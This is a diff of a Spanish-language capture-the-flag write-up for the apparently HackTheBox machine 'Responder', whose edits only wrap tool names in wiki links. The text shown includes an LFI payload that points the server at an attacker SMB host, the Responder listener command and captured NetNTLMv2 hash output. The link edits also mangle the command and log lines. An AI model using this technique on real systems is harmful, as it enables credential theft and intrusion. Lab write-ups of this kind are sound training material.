@@ -12,7 +12,7 @@ created: 2026-04-15
 ---
 ## 1. Información General
 
-- **Máquina:** Responder
+- **Máquina:** [[Responder]]
 - **IP:** 10.129.79.169
 - **SO:** Windows
 - **Dificultad:** Muy fácil
@@ -20,7 +20,7 @@ created: 2026-04-15
 
 ## 2. Resumen Ejecutivo
 
-Se comprometió un servidor Windows que ejecutaba un sitio PHP vulnerable a Local File Inclusion (LFI) sin sanitización de parámetros URL. Aprovechando que PHP permite cargar URLs SMB incluso con `allow_url_include` desactivado, se forzó al servidor a autenticarse contra nuestra máquina atacante mediante el protocolo SMB. Utilizando Responder como listener, se capturó el hash NetNTLMv2 del administrador, que fue crackeado offline con John the Ripper. Las credenciales obtenidas permitieron acceso remoto completo al sistema mediante Evil-WinRM.
+Se comprometió un servidor Windows que ejecutaba un sitio PHP vulnerable a Local File Inclusion (LFI) sin sanitización de parámetros URL. Aprovechando que PHP permite cargar URLs SMB incluso con `allow_url_include` desactivado, se forzó al servidor a autenticarse contra nuestra máquina atacante mediante el protocolo SMB. Utilizando [[Responder]] como listener, se capturó el hash NetNTLMv2 del administrador, que fue crackeado offline con John the Ripper. Las credenciales obtenidas permitieron acceso remoto completo al sistema mediante Evil-WinRM.
 
 ## 3. Enumeración (Reconocimiento)
 
@@ -79,12 +79,12 @@ El protocolo NTLM utiliza un mecanismo de desafío-respuesta: el servidor genera
 
 ## 5. Explotación
 
-### 5.1 Captura del Hash con Responder
+### 5.1 Captura del Hash con [[Responder]]
 
-Se levantó Responder escuchando en la interfaz VPN (`tun0`) para simular un servidor SMB legítimo:
+Se levantó [[Responder]] escuchando en la interfaz VPN (`tun0`) para simular un servidor SMB legítimo:
 
 ```bash
-sudo responder -I tun0
+sudo [[Responder|responder]] -I tun0
 ```
 
 Paralelamente, se envió la siguiente petición desde el navegador, referenciando una ruta UNC hacia nuestra IP de atacante:
@@ -93,11 +93,11 @@ Paralelamente, se envió la siguiente petición desde el navegador, referenciand
 http://unika.htb/?page=//10.10.16.225/whatever
 ```
 
-El servidor intentó autenticarse contra nuestro listener SMB, y Responder capturó el hash NetNTLMv2:
+El servidor intentó autenticarse contra nuestro listener SMB, y [[Responder]] capturó el hash NetNTLMv2:
 
 ```
-[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
-[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:4198d1d8a1688c5e:A0FA6A874359EE98A4536357517D5934:0101...
+[SMB] NTLMv2-SSP Username : [[Responder|RESPONDER]]\Administrator
+[SMB] NTLMv2-SSP Hash     : Administrator::[[Responder|RESPONDER]]:4198d1d8a1688c5e:A0FA6A874359EE98A4536357517D5934:0101...
 ```
 
 ### 5.2 Cracking del Hash con John the Ripper
